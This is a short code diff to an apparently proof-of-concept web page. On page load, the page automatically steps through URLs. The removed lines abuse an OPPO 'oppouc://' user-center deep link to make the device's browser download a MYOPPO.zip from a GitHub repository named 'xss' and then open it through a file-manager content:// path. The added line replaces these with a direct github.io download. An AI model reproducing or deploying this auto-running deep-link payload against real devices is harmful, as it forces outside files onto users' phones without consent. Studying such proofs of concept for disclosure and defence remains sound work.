@@ -12,8 +12,7 @@
     document.addEventListener('DOMContentLoaded', () => {
         const urls = [
             'https://security.oppo.com/en/',
-            'oppouc://usercenter.oppo.com/browser?url=https://github.com/syukirman-amir/xss/raw/main/MYOPPO.zip',
-            'oppouc://usercenter.oppo.com/browser?url=content://com.coloros.filemanager/root/storage/emulated/0/Download/MYOPPO.zip',
+            'https://syukirman-amir.github.io/xss/MYOPPO.zip',
             'https://www.youtube.com/watch?v=tf-HYnN0H4Y'
         ];
 
@@ -24,7 +23,7 @@
             if (index < urls.length) {
                 let delay = defaultDelay;
 
-                if (urls[index] === 'oppouc://usercenter.oppo.com/browser?url=https://github.com/syukirman-amir/xss/raw/main/MYOPPO.zip') {
+                if (urls[index] === 'https://syukirman-amir.github.io/xss/MYOPPO.zip') {
                     delay = specialDelay;
                 }
 
